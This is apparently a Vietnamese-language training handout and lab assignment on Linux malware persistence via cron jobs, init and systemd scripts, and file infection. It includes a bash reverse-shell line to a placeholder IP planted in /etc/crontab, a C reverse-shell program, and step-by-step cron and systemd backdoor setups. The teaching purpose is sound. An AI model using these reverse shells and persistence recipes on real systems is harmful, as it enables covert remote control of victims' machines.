# Persistence Techniques

## [1]. Lý thuyết:

- Nghiên cứu, tìm hiểu các kỹ thuật Malware hay sử dụng để Persistence trên Linux:
  - Cron jobs
  - Subsystems Initialization (startup, rc & init scripts)
  - File Infection and Replacement

### 1. Cron jobs

- `Cron jobs` là một tính năng trong các hệ điều hành họ Unix (bao gồm Linux) được sử dụng để lên lịch thực hiện các nhiệm vụ định kỳ theo khoảng thời gian cụ thể.

- Attacker có thể lạm dụng tính năng `cronjobs` này để thực hiện lập lịch tác vụ nhằm thực thi mã độc lần đầu hoặc định kỳ (`T1053.003`). `Persistence` trên các phiên bản hệ điều hành Unix thông qua sử dụng `Cron jobs` về cơ bản bao gồm việc tạo một `malicious script` và tạo 1 `cronjob` cho script đó.

- Các bước cơ bản để tạo 1 backdoor sử dụng `cronjobs`:

  - `1.` Tạo hoặc tải xuống `malicious script` (Ở đây lấy ví dụ là reverse-shell).

  ```bash
  $ su
  $ echo 'sh -i >& /dev/tcp/10.10.10.10/9000 0>&1' > shell
  $ chmod +x shell
  $ less /etc/crontab
  $ nano /etc/crontab
  ```

  - `2.` Thả tập lệnh của bạn vào `/etc/crontab` hoặc bất kỳ vị trí nào khác nơi chúng ta có thể đặt `cronjob` và đặt thời gian/điều kiện của công việc.

  ```bash
  # Example of job definition:
  # .---------------- minute (0 - 59)
  # |  .------------- hour (0 - 23)
  # |  |  .---------- day of month (1 - 31)
  # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
  # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
  # |  |  |  |  |
  # *  *  *  *  * user-name command to be executed

  *  *    * * *   root    ./shell
  ```

  - `3.` Thực hiện reverse-shell với cronjob vừa tạo.

  ```bash
  nc -lnvp 9000
  ```

- Một số ví dụ về **malware** sử dụng **Cron jobs** bao gồm:

  - **Anchor**: **Anchor** có thể tự cài đặt mình như một **cron job** ¹.
  - **APT38**: **APT38** đã sử dụng **cron** để tạo các công việc nền định kỳ trên hệ thống Linux ¹.
  - **Exaramel for Linux**: **Exaramel for Linux** sử dụng **crontab** để duy trì tính bền vững nếu không có quyền root ¹.
  - **GoldMax**: Phiên bản **GoldMax Linux** đã sử dụng một mục **crontab** với dòng **@reboot** để duy trì tính bền vững ¹.
  - **Janicab**: **Janicab** đã sử dụng một **cron job** để duy trì tính bền vững trên các thiết bị Mac ¹.
  - **Kinsing**: **Kinsing** đã sử dụng **crontab** để tải xuống và chạy các tập lệnh shell mỗi phút để đảm bảo tính bền vững ¹.
  - **NETWIRE**: **NETWIRE** có thể sử dụng **crontabs** để thiết lập tính bền vững ¹.
  - **Penquin**: **Penquin** có thể sử dụng **Cron** để tạo các công việc nền định kỳ và trước lịch ¹.
  - **Rocke**: **Rocke** đã cài đặt một **cron job** để tải xuống và thực thi tệp từ máy chủ điều khiển ¹.
  - **Skidmap**: **Skidmap** đã tự cài đặt thông qua **crontab** ¹.
  - **SpeakUp**: **SpeakUp** sử dụng các tác vụ **cron** để đảm bảo tính bền vững ¹.
  - **Xbash**: **Xbash** có thể tạo một **cron job** để duy trì tính bền vững nếu nó xác định mình đang chạy trên hệ thống Linux ¹.

### 2. Subsystems Initialization (startup, rc & init scripts)

- `Subsystems Initialization` là tên gọi chung khi attacker thực hiện `Persistence` các hành vi độc hại bằng cách tận dụng `Linux init system`. Quan trọng hơn việc này chỉ hoạt động nếu quá trình đang chạy có quyền root.

- Các khái niệm liên quan đến `Linux init system` là:

  - `systemd`: là trình quản lý hệ thống và dịch vụ cho các bản phân phối Linux, quá trình này có nhiệm vụ tương đương với wininit.exe và services.exe kết hợp của Windows.

  - `rc`: liên quan đến quá trình khởi động và quản lý dịch vụ trong hệ thống Linux thường được gọi là "rc system", "rc" thường xuất phát từ "run commands" hoặc "run control," và các thành phần liên quan đến quá trình khởi động thường được tổ chức trong các thư mục có tên bắt đầu bằng "rc.". Dưới đây là một số khái niệm phổ biến trong hệ thống Linux liên quan đến "rc":

    - 1. **rc.d:** Thư mục chứa các script và cấu hình liên quan đến quá trình khởi động và tắt máy trong hệ thống sử dụng hệ thống quản lý dịch vụ và runlevel, chẳng hạn như `/etc/rc0.d/`, `/etc/rc1.d/`, ..., `/etc/rc6.d/`.

    - 2. **rc.local:** Tập tin chứa các lệnh hay script sẽ được thực thi vào cuối quá trình khởi động. Nó cung cấp một cách tiện lợi để thực hiện các tùy chỉnh hoặc cấu hình cụ thể của hệ thống sau khi tất cả các dịch vụ đã được khởi động.

    - 3. **rc.conf:** Một tập tin chứa các cấu hình toàn cục cho hệ thống, đặc biệt là đối với các hệ thống sử dụng hệ thống quản lý dịch vụ và runlevel dựa trên `rc.d` (cấu hình có thể thay đổi tùy thuộc vào bản phân phối cụ thể).

    - 4. **init system:** Hệ thống quản lý dịch vụ và quá trình khởi động của hệ thống Linux, chẳng hạn như SysV init, systemd, Upstart. Các init system quản lý việc khởi động, tắt máy và quản lý các dịch vụ của hệ thống.

  - Một số ví dụ thư mục liên quan `rc.`:

    - 1. **`/etc/rc.d/rc.local`:** Tập tin `rc.local` thường được sử dụng để chứa các lệnh hoặc script sẽ được thực thi vào cuối quá trình khởi động hệ thống. Nếu hệ thống sử dụng `rc.d` để quản lý dịch vụ và runlevel, `rc.local` sẽ thực hiện các tác vụ tự động mỗi khi hệ thống khởi động. Điều này cung cấp một cách tiện lợi để thực hiện các tùy chỉnh hoặc cấu hình cụ thể sau quá trình khởi động.
    - 2. **`/etc/rc.conf`:** Tập tin `rc.conf` thường chứa các cấu hình toàn cục cho hệ thống, đặc biệt là đối với các hệ điều hành Linux sử dụng hệ thống quản lý dịch vụ và runlevel dựa trên `rc.d`. Trong `rc.conf`, bạn có thể cấu hình các biến như hostname, các tham số kernel, cấu hình mạng, v.v. Nó là nơi chính để đặt các tùy chọn cấu hình hệ thống toàn cục.
    - 3. **`/etc/rcX.d/`:** (thường là `/etc/rc0.d/`, `/etc/rc1.d/`, ..., `/etc/rc6.d/`). Đây là một thư mục chứa các liên kết tới các script được sử dụng trong quá trình khởi động và tắt máy cho từng runlevel (`X` thay thế bằng số runlevel). Các runlevel thường bao gồm 0 (tắt), 1 (đơn người dùng), 2 (đa người dùng không có mạng), 3 (đa người dùng có mạng), 4 (chưa được sử dụng nhiều), 5 (đa người dùng với giao diện đồ họa), và 6 (khởi động lại). Trong mỗi thư mục `/etc/rcX.d/`, các liên kết tới các script trong `/etc/init.d/` sẽ được sắp xếp theo thứ tự để xác định thứ tự thực hiện trong quá trình khởi động hoặc tắt máy.
    - 4. **`/etc/rc.local`:** Tập tin `rc.local` thường chứa các lệnh hay script sẽ được thực thi vào cuối quá trình khởi động hệ thống. Nếu tập tin này tồn tại và có quyền thực thi, nó sẽ được thực hiện tự động mỗi khi hệ thống khởi động. Tập tin `rc.local` cung cấp một cách tiện lợi để thực hiện các tùy chỉnh hoặc cấu hình cụ thể của hệ thống sau khi tất cả các dịch vụ đã được khởi động.

  - `/etc/init.d/`: Thư mục `/etc/init.d/` trên hệ thống Linux chứa các script (kịch bản) thực hiện các thao tác khác nhau liên quan đến quá trình khởi động, dừng hoặc quản lý dịch vụ cụ thể trên hệ thống. Cụ thể, các script trong thư mục này thường được sử dụng bởi hệ thống quản lý dịch vụ để điều khiển các dịch vụ đó. Các điểm chính về `/etc/init.d/`:

    - 1.  **Init Scripts:** Đây là các script init (khởi tạo) được thiết kế để khởi động, dừng, tái khởi động hoặc quản lý các dịch vụ cụ thể trên hệ thống. Các dịch vụ này có thể là các phần mềm như máy chủ web, cơ sở dữ liệu, hoặc bất kỳ ứng dụng nào cần được quản lý và kiểm soát trong quá trình khởi động hoặc tắt máy.

    - 2.  **Quản lý Dịch vụ:** Thư mục `/etc/init.d/` thường được sử dụng bởi các hệ thống quản lý dịch vụ như SysV init, Upstart, hoặc các phiên bản của systemd để thực hiện các thao tác như start, stop, restart, reload, enable và disable các dịch vụ.

    - 3.  **Cấu trúc tên file:** Các script trong `/etc/init.d/` thường có tên theo kiểu `<tên_dịch_vụ>` và có thể đi kèm với các tham số như start, stop, restart. Ví dụ, nếu bạn có một dịch vụ tên là `webserver`, script để quản lý dịch vụ có thể là `/etc/init.d/webserver`.

    - 4.  **Thực hiện các Hành động Tùy chỉnh:** Các hệ thống quản lý dịch vụ thường sử dụng các script trong `/etc/init.d/` để thực hiện các hành động tùy chỉnh như thiết lập môi trường, khởi động các tiến trình, hoặc chạy các câu lệnh trước và sau khi dịch vụ được khởi động hoặc tắt máy.

### 3. File Infection and Replacement

- Đây là hình thức `persistence` bằng cách thay thế hoặc là lây nhiễm thông qua thực thi các file đã tồn tại trên máy nạn nhân. Mục tiêu có thể là:
  - Các file hệ thống hoặc các chương trình sẵn có trên hệ thống unix như: các file trong thư mục `/bin/` hoặc `/usr/bin/` như ls, ps, netstat.
  - Thực thi kèm theo khi các file thực thi elf của các ứng dụng phổ biến thực thi như: firefox, thunderbird,...

## [2]. Thực hành:

- Code reverse-shell làm malware mẫu để demo:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define MAX_BUFFER_SIZE 1024

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <ip> <port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);

    char commad[MAX_BUFFER_SIZE];
    sprintf(commad, "bash -c \"/bin/bash -i >& /dev/tcp/%s/%d 0>&1\"", ip, port);
    int result = system(commad);

    if (result == 0) {
        printf("Reverse shell to %s:%d\n", ip, port);
    } else {
        fprintf(stderr, "Reverse shell failed\n");
    }
    return 0;
}
# gcc reverse-shell.c -o reverse-shell
```

- Bài 01 (2đ): Lập trình malware mô phỏng kỹ thuật `Cron jobs`.

  - Tạo một cron job chạy lệnh `./reverse-shell 127.0.0.1 1337` mỗi 3 phút trên crontab:

    - 1.  Mở crontab cho việc chỉnh sửa:

      ```bash
      crontab -e
      ```

    - 2.  Thêm dòng sau vào cuối tệp:

      ```bash
      */3 * * * * /đường/dẫn/đến/tập/tin/reverse-shell 127.0.0.1 1337
      ```

  - Có rất nhiều cách để `persistence` hệ thống linux sử dụng kỹ thuật `Cron jobs`, tham khảo:

    - https://pberba.github.io/security/2022/01/30/linux-threat-hunting-for-persistence-systemd-timers-cron/#7-scheduled-taskjob-cron

- Bài 02 (4đ): Lập trình malware mô phỏng kỹ thuật `Subsystems Initialization`.

  - Sử dụng Tệp tin khởi động (systemd):

    - 1. Tạo một tệp tin service cho systemd (ví dụ: `/etc/systemd/system/reverse-shell.service`):

      ```ini
      [Unit]
      Description=Reverse Shell

      [Service]
      ExecStart=/đường/dẫn/đến/tập/tin/reverse-shell 127.0.0.1 1337
      Restart=always

      [Install]
      WantedBy=default.target
      ```

      Thay thế `/đường/dẫn/đến/tập/tin/` bằng đường dẫn thực tế đến thư mục chứa tập tin `reverse-shell`.

    - 2. Enable và start service:

      ```bash
      sudo systemctl enable reverse-shell.service
      sudo systemctl start reverse-shell.service
      ```

  - Có rất nhiều cách để `persistence` hệ thống linux sử dụng kỹ thuật `Subsystems Initialization`, tham khảo:
    - https://pberba.github.io/security/2022/02/06/linux-threat-hunting-for-persistence-initialization-scripts-and-shell-configuration/#8-boot-or-logon-initialization-scripts-rc-scripts
    -

- Output:
  - File tài liệu ghi lại các nội dung quan trọng đã nghiên cứu.
  - Mã nguồn và file thực thi đã biên dịch. Lập trình rõ ràng, sạch đẹp (coding convention chuẩn).
  - Bốc thăm trình bày về Persistence Techniques (có slide).

## [3]. References:

- Understanding Linux Malware.pdf
- Google
- https://www.linode.com/docs/guides/linux-red-team-persistence-techniques/
- https://infosecwriteups.com/persistence-backdoor-techniques-beginner-to-advanced-in-linux-dd7e109ceeb9
- https://redcanary.com/blog/attck-t1501-understanding-systemd-service-persistence/
